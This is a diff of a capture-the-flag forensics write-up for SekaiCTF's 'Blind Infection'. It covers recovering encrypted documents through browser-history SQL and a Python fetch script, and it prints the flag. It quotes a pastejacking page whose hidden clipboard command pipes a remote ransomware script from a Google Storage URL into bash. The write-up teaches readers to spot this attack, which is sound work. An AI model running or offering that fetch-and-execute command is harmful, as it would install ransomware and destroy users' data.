@@ -29,7 +29,7 @@ authors: Battlemonger
 genre: forensics
 points: 470
 description: |
-    *Investigator*: It looks like your files were encrypted—do you have a backup?  
+    *Investigator*: It looks like your files were encrypted — do you have a backup?  
     *Me*: Online, yes, but even the backup links got encrypted. Can you help me find anything?
 files: '[chall.zip](https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU3T4cZcAV)'
 {% endchallenge %}
@@ -38,9 +38,29 @@ files: '[chall.zip](https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU
 **Warning**: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution.
 {% endwarning %}
 
+### Reconnaissance
+
+<div class="flex-container">
+<div>
+
 Unzipping the provided `.zip` provides us with four Linux directories: `etc/`, `home/`, `root/`, and `snap/`. Let's start off with a little bit of reconnaissance.
 
-A good habit with these types of challenges is to check `etc/passwd`, which provides a list of system accounts. If we `grep` for those with root permission, we find that the user `sekaictf` was a superuser:
+A good habit with these types of challenges is to check `etc/passwd`, a list of system accounts. If we `grep` for those with root permission, we find that the user `sekaictf` was a superuser:
+
+</div>
+<div>
+
+{% ccb html:true terminal:true %}
+<span class="meta prompt_">$</span> <span class="built_in">tree</span>
+<span class="string">.</span>
+<span class="string">├──</span> <span class="number">etc</span>
+<span class="string">├──</span> <span class="number">home</span>
+<span class="string">├──</span> <span class="number">root</span>
+<span class="string">└──</span> <span class="number">snap</span>
+{% endccb %}
+
+</div>
+</div>
 
 {% ccb html:true terminal:true %}
 <span class="meta prompt_">$ </span><span class="built_in">cat</span> etc/passwd | grep <span class="string">&#x27;bash&#x27;</span>
@@ -48,7 +68,9 @@ root:x:0:0:root:/root:/bin/bash
 sekaictf:x:1000:1000:sekaictf,,,:/home/sekaictf:/bin/bash
 {% endccb %}
 
-Moving on, if we check out `home/sekaictf/.bash_history` we see that it exists but is completely empty. A recursive `grep` for the flag format, `SEKAI{`, also turns out empty.
+Although it isn't necessarily pertinent to the challenge, make sure you check `home/sekaictf/.bash_history` alongside `grep -r "SEKAI{` - they can be pretty handy sometimes!
+
+### Document Recovery
 
 Next, we'll look for user files. The `Documents/` and `Pictures/` folder of the `sekaictf` user has them, but everything seems to be encrypted with no indication of the encryption method used.
 
@@ -108,11 +130,11 @@ There are 50 instances of the URL <https://paste.c-net.org> in the table and vis
 SELECT url FROM 'moz_places' WHERE URL like '%paste%'
 {% endcodeblock %}
 
-![Executing the above SQL on the table](/asset/sekai/execution.png)
+{% cimage src:/asset/sekai/execution.png width:600px %}
 
 Let's write a simple `curl` script with Python:
 
-{% ccb lang:py gutter1:1-58 scrollable:true %}
+{% ccb caption:solve.py lang:py gutter1:1-58 scrollable:true %}
 import requests
 
 urls = [
@@ -173,9 +195,9 @@ for url in urls:
         print(r.text)
 {% endccb %}
 
-Let's run the script:
+Running the script:
 
-{% ccb html:true terminal:true %}
+{% ccb html:true terminal:true highlight:2 %}
 <span class="meta prompt_">$ </span><span class="built_in">python3</span> solve.py
 SEKAI{R3m3b3r_k1Dz_@lway5_84cKUp}
 {% endccb %}
@@ -199,13 +221,15 @@ files: '[chall.zip](https://drive.google.com/u/0/uc?id=1d3vuYvnIRR1Nr0y-_g-Z5IjU
 **Warning**: This payload contains ransomware. Consider using a fresh virtual machine, as you may risk losing your data. Although surface analysis is safe (and the ransomware is user-triggered), proceed with caution.
 {% endwarning %}
 
-We've managed to get all of their `Documents/` folder back, but they didn't backup `Pictures/`. To decrypt them, we need to know the encryption method used. As of now, we only have the plaintext and ciphertext from Part 1, which currently don't prove that useful. We need more details.
+We've managed to restore the contents of `Documents/`, but this user has unfortunately failed to backup `Pictures/`. To decrypt them, we need to know the encryption method used. As of now, we only have the plaintext and ciphertext from Part 1, which currently don't prove that useful. We need more details.
 
-Continuing to scroll through browser history, near the end of the table we come across instances of the user searching about 'virus' and 'virus remover'. This probably happened after the user's files got encrypted. Looking at the URL visits just before this, we see that the user was downloading various rhythm game stuff, including [osu!](https://osu.ppy.sh/) beatmaps and an `.apk` of [Project Sekai](https://projectsekai.fandom.com/wiki/Project_SEKAI_COLORFUL_STAGE!). This rabbit hole eventually led to a string of suspicious websites — including <https://sekaictf-tunes.netlify.app>:
+### The SQL Rabbit Hole
+
+Continuing to scroll through browser history, near the end of the table we come across instances of the user searching about 'virus' and 'virus remover'. This probably happened after the user's files got encrypted. Looking at the URL visits just before this, we see that the user was downloading various rhythm game-related items, including [osu!](https://osu.ppy.sh/) beatmaps and an `.apk` of [Project Sekai](https://projectsekai.fandom.com/wiki/Project_SEKAI_COLORFUL_STAGE!). This rabbit hole eventually led to a string of suspicious websites — including <https://sekaictf-tunes.netlify.app>:
 
 ![Screenshot of pure HTML page with a suspicious wget command](/asset/sekai/sussy.png)
 
-```html
+{% ccb lang:html gutter1:1-16 caption:"Source code of https://sekaictf-tunes.netlify.app" url:https://sekaictf-tunes.netlify.app url_text:source %}
 <html>
     <head>
         <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
@@ -222,11 +246,11 @@ Continuing to scroll through browser history, near the end of the table we come 
         </script>
     </body>
 </html>
-```
+{% endccb %}
 
 Check out this snippet above: instead of copying `wget sekairhythms.com/epicmusic.zip`, we end up actually copying `curl https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh | bash`, which is a malicious bash script.
 
-The premise of this challenge is: **Never copy and paste code/commands from internet blindly**! That's where the challenge name comes from — "Blind Infection" (Get it? :D).
+This is the premise of the challenge. **Never copy and paste code/commands from internet blindly**! That's where the challenge name comes from — "Blind Infection"!
 
 This is a classic [pastejacking](https://www.geeksforgeeks.org/what-is-pastejacking/) attack. Let's *not* copy it into the terminal and instead analyze the `.sh` file that's `curl`'ed. Visit the [original link](https://storage.googleapis.com/sekaictf/Forensics/muhahaha.sh) to see the raw code:
 
